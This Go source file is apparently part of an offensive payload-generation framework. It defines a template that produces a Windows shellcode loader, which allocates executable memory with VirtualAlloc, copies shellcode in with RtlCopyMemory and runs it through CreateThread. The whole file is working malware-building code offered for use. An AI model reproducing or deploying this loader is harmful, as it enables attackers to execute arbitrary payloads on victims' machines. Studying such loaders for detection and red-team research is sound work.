package loaders

import (
	"fmt"
	"strings"
)

type CreateTTemplate struct{}

func (t CreateTTemplate) Import() string {
	return fmt.Sprintf(`
import (
	"syscall"
	"unsafe"
)
`)
}

func (t CreateTTemplate) Const() string {
	return fmt.Sprintf(`
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	ntdll           = syscall.MustLoadDLL("ntdll.dll")

    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	CreateThread        = kernel32.MustFindProc("CreateThread")

    RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
)
`)
}

func (t CreateTTemplate) Init() string {
	return fmt.Sprintf(``)
}

func (t CreateTTemplate) Process() string {
	return fmt.Sprintf(`
	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	_, _, _ = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

    threadAddr, _, _ := CreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)

    WaitForSingleObject.Call(
        threadAddr,
        0xFFFFFFFF,
    )
`)
}

func (t CreateTTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__INIT__	

__IMPORT__PROCESS__
	
}
    `
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
}
